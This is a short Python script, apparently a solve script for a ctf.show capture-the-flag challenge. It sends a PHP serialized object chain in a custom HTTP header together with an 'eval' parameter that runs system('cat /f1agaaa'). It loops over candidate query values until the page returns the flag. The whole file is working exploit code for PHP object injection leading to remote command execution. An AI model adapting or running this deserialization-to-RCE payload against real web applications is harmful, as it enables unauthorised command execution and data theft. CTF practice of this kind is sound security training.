import requests
import re

mi = ['i6xstx6d6x6ir','u5zarz5s5z5ue','y4lpel4a4l4yw','sqnhonqjqnqsi','dwmjpmwkwmwdo','fe1ka1ele1efp']
d = 1
while d<2:
    for i in mi:
        data = {
            'eval':'system("cat /f1agaaa");'
        }
        url = f"http://c77fb5f3-778a-4a3c-ba16-62701392c7a9.challenge.ctf.show/index.php?get={i}"
        header = {
            'aaaaaa':'O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:1:"a";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";r:1;s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}'
        }
        reqpose = requests.post(url=url,data=data,headers=header).text
        re_text = re.findall(r"(?<=</code>).*", reqpose, re.S)
        if '' not in re_text:
            print(re_text[0])
            d += 1
